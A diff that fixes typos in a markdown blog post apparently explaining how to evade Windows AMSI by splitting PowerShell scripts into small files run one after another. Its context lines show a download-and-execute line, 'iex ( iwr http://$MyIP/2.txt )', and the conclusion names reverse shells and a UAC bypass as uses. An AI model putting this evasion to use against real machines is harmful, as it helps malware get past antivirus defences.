@@ -23,14 +23,14 @@ A defense mechanism for the offensive side, means that it need a bypass, and tha
 
 ## Problem?
 
-With all those differents AMSI bypasses, using .NET related offensive tools become possible again. Until those AMSI bypasses got signatures and become detected, and that open a new static analysis bypass/ obfuscation adventures, Which sometimes become so boring and time consuming with a high possibility to not get a good result.
+With all those differents AMSI bypasses, using .NET related offensive tools become possible again. Until those AMSI bypasses got signatures and become detected, and that open a new static analysis bypass/obfuscation adventures, Which sometimes become so boring and time consuming with a high possibility to not get a good result.
 
 Personally, i use powershell a lot, and i got tired of obfuscating small scripts, so it was very important for me to find a new way to bypass AMSI in powershell ..
 
 ## Thought Process
 
-I'm sure if you have ever played with AMSI bypass before, you have noticed that copying pasting a script into a powershell terminal will bypass AMSI, even if the script itself is detected.
-And that's because by copying and pasting a script, it's executed as separated lines, and it's very unusual to create a signature for and individual line, because that will cause alot of false positives. So how to get advantage of this ..? how can this be used in a real scenario? Maybe dividing the script into small files? let's try this ..
+I'm sure if you have ever played with AMSI bypass before, you have noticed that copying pasting a script into a powershell session will bypass AMSI, even if the script itself is detected.
+And that's because by copying and pasting a script, it's executed as separated lines, and it's very unusual to create a signature for an individual line, because that will cause alot of false positives. So how to get advantage of this ..? how can this be used in a real scenario? Maybe dividing the script into small files? let's try this ..
 
 ### Simple Test
 
@@ -43,7 +43,7 @@ $var = Get-Process
 cat $var
 ```
 
-Let's divided into 3 files, and execute the main one, to see if there any problems with scoping or something else..
+Let's divided it into 3 files, and execute the main one, to see if there are any problems with scoping or something else..
 
 ```powershell
 # 1.txt
@@ -65,7 +65,7 @@ iex ( iwr http://$MyIP/2.txt -UseBasicParsing );
 > the 2 files here ```1.txt and 2.txt``` can be hosted online, or in your local machine by simply starting a simple python web server `python3 -m http.server 80`.
 {: .prompt-info }
 
-By executing `./main.ps1` We see the processes list, which means that the variable in `1.txt` is accessible by `2.txt`. Good, let's try something else, maybe `Add-Type`.
+By executing `./main.ps1` We see the processes list, which means that the variable `$var` in `1.txt` is accessible by `2.txt`. Good, let's try something else, maybe `Add-Type`.
 
 > `Add-Type` cmdlet adds a Microsoft .NET class to a PowerShell session. It's used by Some AMSI Bypass which we'll see later ..
 {: .prompt-info }
@@ -237,7 +237,7 @@ It Successfully Bypass AMSI, without changing a letter in the code! Niice..
 
 ## Conclusion
 
-We reached the end of the post, 
+We reached the end of the post,
 
 As a review, we saw how to bypass AMSI by dividing a script into small files. I think the most useful use-case of this method is execute an AMSI bypass, but it can be applied on any scripts ( small scripts ), Reverse shell, FODHelper UAC Bypass .. I didn't testing on a script that contains defined functions, but the principle stay the same.
 
